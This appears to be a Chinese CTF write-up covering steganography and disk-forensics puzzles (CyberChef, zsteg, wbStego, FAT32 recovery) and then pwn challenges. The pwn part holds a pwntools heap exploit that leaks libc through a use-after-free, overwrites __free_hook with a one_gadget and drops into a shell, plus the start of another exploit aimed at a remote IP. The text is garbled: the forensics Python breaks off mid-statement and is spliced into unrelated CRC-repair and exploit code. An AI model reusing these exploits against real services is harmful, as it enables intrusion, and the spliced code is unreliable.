利用CyberChef解码，得到：GOODNIGHTSWEETIE
打开第三个word文档，发现无法读取的内容
修改后缀为压缩包，发现4.zip
4.zip里有一个bmp图片，先用zsteg分析一下：
发现有一个wbStego隐写，直接提取提取不出来，需要利用工具wbstego43open。
选择Decode，选择图片，输入密码后，设置保存路径即可获得flag文件
###  xixixi
下载附件得到一个磁盘文件，装载后得到一张kejin.png，左上角有flag的一小部分
利用DiskGenius装载虚拟磁盘，恢复文件后得到被删除的文件
有用的一共就两个文件，一个是xi.py，一个是xixi.py。得到两段代码：
xixi.py
    import struct
    class FAT32Parser(object):
        def __init__(self, vhdFileName):
            with open(vhdFileName, 'rb') as f:
                self.diskData = f.read()
            self.DBR_off = self.GetDBRoff()
            self.newData = ''.join(str(self.diskData))
        def GetDBRoff(self):
            DPT_off = 0x1BE
            target = self.diskData[DPT_off+8:DPT_off+12]
            DBR_sector_off, = struct.unpack("I4s", d)
        #print(lenth,ctype_type) #length 数据长度，ctype_type 数据块类型
        data = read(lenth)
        crc = struct.unpack(">I", read(4))[0]
        #print(crc)
        real_crc = binascii.crc32(ctype_type+data) & 0xffffffff
        #print(real_crc)
        real_data = struct.pack(">I", lenth) + ctype_type + data + struct.pack(">I", real_crc)
        flag.write(real_data)
        if crc != real_crc: #CRC错误的IDAT数据块
            b_endian = struct.pack(">I", crc)
            clusterList = struct.unpack("> ',str(num))
    def add(idx,con):
        cho(1)
        sla('index?',str(idx))
        sla('name?',con)
    def show(idx):#1
        cho(3)
        sla('index?',str(idx))
    def delete(idx):
        cho(2)
        sla('index?',str(idx))
    def uaf(idx):#1
        cho(5)
        sla('steal?',str(idx))
    def add2():#1
        cho(6)
    for i in range(9):
        add(i,'a')
    for i in range(7):
        delete(8-i)
    uaf(1)
    show(1)
    ru('\x0a')
    libc_base = leak_address() - 0x1e4ca0
    print(hex(libc_base))
    delete(0)
    add2()
    for i in range(7):
        add(8-i,'a')
    add(0,'a')
    delete(1)
    delete(0)
    for i in range(2,9):
        delete(i)
    for i in range(3,8):
        add(i,'b')
    free_hook = libc_base+libc.sym['__free_hook']
    malloc_hook = libc_base+libc.sym['__malloc_hook']
    print(hex(free_hook))
    print(hex(malloc_hook))
    one = libc_base + 0xe2383 
    add(0,b'a'*0xd0+p64(0)+p64(0x111)+p64(free_hook))
    add(1,'b'*8)
    add(2,p64(one))
    cho(2)
    sla('index?',str(0))
    ia()
###  Beauty_Of_ChangChun
smallbin stash打随机数
    #!/usr/bin/python
    from pwn import *
    import sys
    context.log_level = 'debug'
    context.arch='amd64'
    local=0
    binary_name='changchun'
    #libc_name=''
    if local:
        p=process("./"+binary_name)
    else:
        p=remote('112.126.71.170',43652)
        e=ELF("./"+binary_name)
    def z(a=''):
        if local:
            gdb.attach(p,a)
            if a=='':
                raw_input
        else:
            pass
    ru=lambda x:p.recvuntil(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sa=lambda a,b:p.sendafter(a,b)